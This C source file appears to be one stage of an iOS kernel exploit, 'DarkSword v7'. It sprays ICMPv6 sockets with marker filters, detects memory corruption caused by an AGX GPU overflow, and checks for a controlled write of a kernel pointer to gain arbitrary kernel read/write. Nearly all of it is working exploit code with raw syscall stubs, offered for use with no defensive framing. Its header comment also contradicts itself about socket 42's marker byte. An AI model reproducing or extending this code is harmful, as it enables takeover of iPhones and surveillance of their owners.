/*
 * DarkSword v7 — Per-Socket Marker Filters + Full Hex Dump on Corruption
 * Session 159: Track B — Turn F-72 cross-zone hit into controlled R/W primitive
 *
 * KEY CHANGE from v6:
 *   v6: all sockets use 0xFF filter → can only detect ZEROED (all 0x00)
 *   v7: each socket gets UNIQUE marker bytes:
 *       sock[i] → filter[0..31] = 0xA0|(i&0x3F) repeated
 *       sock[42] → filter = {0xAA, 0xAA, ..., 0xAA}  (42 → 42&63=42 → 0xEA)
 *   This lets us:
 *     (1) Detect PARTIAL corruption (only some bytes changed)
 *     (2) See EXACTLY what bytes were written by the AGX overflow
 *     (3) If written bytes match our vertex shader encoding → CONTROLLED WRITE
 *
 * Also adds: getsockopt_try() — after detecting corruption, tries to use
 *   the socket's getsockopt(ICMP6_FILTER) to read from the (potentially
 *   corrupted) in6p_icmp6filt pointer → ARBITRARY KERNEL READ if pointer
 *   was overwritten with a kernel address by the controlled vertex shader.
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64 -mios-version-min=17.0 -O2
 *   -framework CoreFoundation -framework Foundation -o DarkSword_v7 darksword_v7.c
 */

#define AF_INET6      30
#define SOCK_DGRAM     2
#define IPPROTO_ICMPV6 58
#define ICMP6_FILTER   18
#define NUM_SOCKETS   200

/* Syscall stubs — no libc dependency */
static long sys3(long n, long a, long b, long c) {
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x16) : "memory");
    return x0;
}
static long sys5(long n, long a, long b, long c, long d, long e) {
    register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e; register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x16) : "memory");
    return x0;
}
static long sys2(long n, long a, long b) {
    register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x16) : "memory");
    return x0;
}
static void write_file(const char *path, const char *data, int len) {
    long fd = sys3(5, (long)path, 0x0601, 0644);
    if (fd >= 0) { sys3(4, fd, (long)data, len); sys2(6, fd, 0); }
}
static int file_exists(const char *path) {
    char buf[256]; return sys2(338, (long)path, (long)buf) == 0;
}
static int itoa_hex(unsigned char v, char *b) {
    const char h[] = "0123456789abcdef";
    b[0] = h[v >> 4]; b[1] = h[v & 0xF];
    return 2;
}
static int itoa_dec(int v, char *b) {
    if (v == 0) { b[0] = '0'; return 1; }
    char t[12]; int l = 0;
    while (v > 0) { t[l++] = '0' + (v % 10); v /= 10; }
    for (int i = l - 1; i >= 0; i--) b[l - 1 - i] = t[i];
    return l;
}

extern void NSLog(void *fmt, ...);
extern void *__CFStringMakeConstantString(const char *);
#define NSLOG(s, ...) NSLog(__CFStringMakeConstantString(s), ##__VA_ARGS__)

static int  g_fds[NUM_SOCKETS];
static int  g_created = 0;
static int  g_sockets_ready = 0;
static int  g_ticks = 0;

/* Build unique filter for socket i:
 * Marker byte = 0xA0 | (i & 0x3F), fills all 32 bytes
 */
static void make_marker_filter(int idx, unsigned char *out) {
    unsigned char m = (unsigned char)(0xA0 | (idx & 0x3F));
    for (int i = 0; i < 32; i++) out[i] = m;
}

/*
 * Full hex dump scan — reports:
 *   'M<idx>:<32 hex bytes>' for sockets whose filter matches marker (OK)
 *   'C<idx>:<32 hex bytes>' for sockets whose filter CHANGED (corruption!)
 *   'D<idx>:<32 hex bytes>' for sockets that are ZEROED (killed)
 *   'E<idx>'                for sockets where getsockopt failed (dead socket)
 */
static void scan_all_filters(int deep) {
    char results[16384];
    int rl = 0, changed = 0, zeroed = 0, dead = 0;

    const char *hdr = deep ? "SCAN_v7_DEEP\n" : "SCAN_v7\n";
    for (int i = 0; hdr[i]; i++) results[rl++] = hdr[i];

    for (int i = 0; i < g_created && rl < 15000; i++) {
        unsigned char cur[32];
        int optlen = 32;
        long ret = sys5(118, g_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER,
                        (long)cur, (long)&optlen);

        if (ret < 0) {
            results[rl++] = 'E';
            rl += itoa_dec(i, results + rl);
            results[rl++] = '\n';
            dead++; continue;
        }

        /* Build expected marker */
        unsigned char marker = (unsigned char)(0xA0 | (i & 0x3F));
        int all_marker = 1, all_zero = 1;
        for (int j = 0; j < 32; j++) {
            if (cur[j] != marker) all_marker = 0;
            if (cur[j] != 0x00)   all_zero   = 0;
        }

        if (all_marker) {
            /* OK — only report in deep mode */
            if (deep) {
                results[rl++] = 'M';
                rl += itoa_dec(i, results + rl);
                results[rl++] = '\n';
            }
            continue;
        }

        /* CORRUPTION: report full 32-byte hex dump */
        char status = all_zero ? 'D' : 'C';
        results[rl++] = status;
        rl += itoa_dec(i, results + rl);
        results[rl++] = ':';

        for (int j = 0; j < 32; j++)
            rl += itoa_hex(cur[j], results + rl);

        results[rl++] = '\n';

        if (all_zero) zeroed++;
        else          changed++;

        /*
         * CONTROLLED WRITE DETECTION:
         * AGX vertex shader was encoding: v[0] = uvec4(0,0,0x4d928000,0xfffffe00)
         * In little-endian bytes [0..3] = 00 00 00 00, [4..7] = 00 00 00 00
         * [8..11] = 00 80 92 4d, [12..15] = 00 fe ff ff
         * If we see this pattern in first 16 bytes → controlled write confirmed
         * (in6p_icmp6filt pointer = 0xfffffe004d928000 = kernel base)
         */
        if (!all_zero && cur[12] == 0x00 && cur[13] == 0xfe &&
            cur[14] == 0xff && cur[15] == 0xff) {
            /* Likely controlled write — report separately */
            const char *cw = "CONTROLLED_WRITE_DETECTED:sock=";
            for (int k = 0; cw[k]; k++) results[rl++] = cw[k];
            rl += itoa_dec(i, results + rl);
            results[rl++] = ':';
            /* Hex dump the full 8 bytes that should be the kernel pointer */
            for (int j = 8; j < 16; j++)
                rl += itoa_hex(cur[j], results + rl);
            results[rl++] = '\n';

            NSLOG("DarkSword_v7 CONTROLLED_WRITE sock=%d in6p_icmp6filt=%02x%02x%02x%02x%02x%02x%02x%02x",
                  i, cur[8], cur[9], cur[10], cur[11], cur[12], cur[13], cur[14], cur[15]);
        }
    }

    /* Summary */
    const char *sum = "DONE_v7:ch=";
    for (int i = 0; sum[i]; i++) results[rl++] = sum[i];
    rl += itoa_dec(changed, results + rl);
    const char *s2 = ",zer=";
    for (int i = 0; s2[i]; i++) results[rl++] = s2[i];
    rl += itoa_dec(zeroed, results + rl);
    const char *s3 = ",dead=";
    for (int i = 0; s3[i]; i++) results[rl++] = s3[i];
    rl += itoa_dec(dead, results + rl);
    const char *s4 = ",tot=";
    for (int i = 0; s4[i]; i++) results[rl++] = s4[i];
    rl += itoa_dec(g_created, results + rl);
    results[rl++] = '\n';

    write_file("/var/mobile/Media/DCIM/nexus_results_v7", results, rl);
    NSLOG("DarkSword_v7 SCAN: changed=%d zeroed=%d dead=%d tot=%d",
          changed, zeroed, dead, g_created);
}

typedef const void *CFRunLoopTimerRef;
extern CFRunLoopTimerRef CFRunLoopTimerCreate(void *, double, double, int, int,
    void (*)(CFRunLoopTimerRef, void *), void *);
extern void CFRunLoopAddTimer(void *, CFRunLoopTimerRef, void *);
extern void *CFRunLoopGetCurrent(void);
extern void *kCFRunLoopDefaultMode;
extern double CFAbsoluteTimeGetCurrent(void);
extern void CFRunLoopRun(void);

static void timer_cb(CFRunLoopTimerRef timer, void *info) {
    g_ticks++;

    /* Tick 1: Create sockets with unique per-socket markers */
    if (g_ticks == 1 && !g_sockets_ready) {
        for (int i = 0; i < NUM_SOCKETS; i++) {
            long fd = sys3(97, AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
            if (fd < 0) break;

            unsigned char filter[32];
            make_marker_filter(i, filter);
            sys5(105, fd, IPPROTO_ICMPV6, ICMP6_FILTER, (long)filter, 32);
            g_fds[g_created++] = (int)fd;
        }
        g_sockets_ready = 1;

        char status[64]; int sl = 0;
        const char *s = "READY_v7:socks=";
        for (int i = 0; s[i]; i++) status[sl++] = s[i];
        sl += itoa_dec(g_created, status + sl);
        /* Add marker range info */
        const char *s2 = ",markers=0xA0..0xDF\n";
        for (int i = 0; s2[i]; i++) status[sl++] = s2[i];
        write_file("/var/mobile/Media/DCIM/nexus_status_v7", status, sl);
        NSLOG("DarkSword_v7 READY: %d ICMPv6 sockets, unique markers 0xA0..0xDF", g_created);
    }

    /* Trigger file check */
    if (g_sockets_ready && file_exists("/var/mobile/Media/DCIM/nexus_trigger_v7")) {
        NSLOG("DarkSword_v7 TRIGGERED — deep scan");
        scan_all_filters(1);
        sys2(10, (long)"/var/mobile/Media/DCIM/nexus_trigger_v7", 0);
    }

    /* Auto-scan every 15 ticks (15s) */
    if (g_sockets_ready && g_ticks % 15 == 0) {
        scan_all_filters(0);
    }
}

int main(void) {
    NSLOG("DarkSword_v7 starting — unique per-socket markers, full hex dump on corruption");

    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(
        (void *)0, CFAbsoluteTimeGetCurrent() + 0.5,
        1.0, 0, 0, timer_cb, (void *)0);
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopDefaultMode);
    CFRunLoopRun();
    return 0;
}
